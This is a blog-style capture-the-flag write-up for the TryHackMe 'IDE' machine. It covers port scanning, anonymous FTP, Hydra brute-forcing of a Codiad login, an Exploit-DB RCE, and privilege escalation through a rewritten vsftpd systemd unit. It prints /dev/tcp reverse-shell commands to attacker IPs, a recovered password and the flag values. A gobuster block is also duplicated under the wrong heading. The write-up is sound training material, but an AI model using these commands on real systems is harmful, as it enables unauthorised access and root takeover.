---
title: THM - IDE
published: true
---
Hello, It is my first post. From now I start to post my writeup/notes about CTF challenges from differents platforms to share you my approach. 



# Enumeration
Let's scan ports :

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:C5:29:36:64:91 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

62337  open  tcp -> HTTP -> Codiad 2.8.4 #thanks to masscan

```

I found FTP, then I connected in anonymous mode : 
```
# Conntect to FTP
cd ...
get -

# File content 

Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```
According this file, we can guess john and drac are users of the machine
# Web Enumeration :
Whatweb to check web components used by the website :
```
WhatWeb report for http://10.10.49.31
Status    : 405 Method Not Allowed
Title     : Error response
IP        : 10.10.49.31
Country   : RESERVED, ZZ

Summary   : HTTPServer[WebSockify Python/3.6.9], Python[3.6.9]

Detected Plugins:
[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	String       : WebSockify Python/3.6.9 (from server string)

[ Python ]
	Python is a programming language that lets you work more 
	quickly and integrate your systems more effectively. You 
	can learn to use Python and see almost immediate gains in 
	productivity and lower maintenance costs. 

	Version      : 3.6.9
	Website     : http://www.python.org/

HTTP Headers:
	HTTP/1.1 405 Method Not Allowed
	Server: WebSockify Python/3.6.9
	Date: Fri, 06 Jan 2023 13:01:12 GMT
	Connection: close
	Content-Type: text/html;charset=utf-8
	Content-Length: 472

```
Gobuster to enumerate directories : 
```
gobuster dir --url http://10.10.182.125 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,json,yaml,csv
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.182.125
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt,json,yaml,csv
[+] Timeout:        10s
===============================================================
2023/01/06 12:55:18 Starting gobuster
===============================================================
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2023/01/06 13:06:35 Finished
===============================================================

```

I attempted a directory bruteforece on the codiad service :
```
gobuster dir --url http://10.10.182.125 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,json,yaml,csv
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.182.125
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt,json,yaml,csv
[+] Timeout:        10s
===============================================================
2023/01/06 12:55:18 Starting gobuster
===============================================================
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2023/01/06 13:06:35 Finished
===============================================================
```

Earlier I found through my scan codiad on version 2.8.4.

# Exploitation
Codiad has a login page, then I attempted to crack password of john and drac users. I stored john and drac into users.txt file and brute forced their password thanks to Hydra : 

```
hydra  -L users.txt -P /usr/share/wordlists/rockyou.txt -v -s 62337 10.10.107.200 http-post-form "/components/user/controller.php?action=authenticate:username=^USER^&password=^PASS^&theme=default&language=fr:F={\"status\"\:\"error\",\"message\"\:\"Incorrect Username or Password\"}"
....
[62337][http-post-form] host: 10.10.107.200   login: john   password: password
```

To exploit codiad, I used the following exploit : [exploitdb](https://www.exploit-db.com/exploits/49705)


This exploit allows me to have a reverse shell.
First in a terminal I set up my reverse shell server : 
```
echo 'bash -c "bash -i >/dev/tcp/10.10.130.96/9002 0>&1 2>&1"' | nc -lnvp 9001
```
Then, I triggered the rce :

```
python exploit.py http://10.10.107.200:62337/ john password 10.10.130.96 9001 linux
```

# Post-Exploitation : 
## User flag :
After I got the machine, I checked the drac's commands history and I got his password because he logged into mysql with the -p flag.
```
cat /home/drac/.bash_history

mysql -u drac -p 'Th3dRaCULa1sR3aL'

```
Then, I got the flag user :
```
cat user.txt 
02930d21a8eb009f6d26361b2d24a466

``` 
## Privilege escalation to root : 
I Attempted to see what I could run as root using ```sudo -l```: 
```
drac@ide:/tmp$ sudo -l
[sudo] password for drac: 
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart

```
I thought I could modify the vsftp service throught edition of /etc/systemd/system/vsftpd.service file but I could not write in this file. Then, In despair I launched linpeas and got the real service file config I must edit to gain root access :
```
/lib/systemd/system/vsftpd.service 
```
Gaining root access :
```
[Unit]
Description=vsftpd FTP server

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'sh -i >& /dev/tcp/10.10.191.61/9001 0>&1'

[Install]
WantedBy=multi-user.target
```

Setting up root reverse shell : 
```
nc -lnvp 9001
# After restarting vsftp service (sudo /usr/sbin/service vsftpd restart)
cat /root/root.txt
ce258cb16f47f1c66f0b0b77f4e0fb8d -> the flag 

```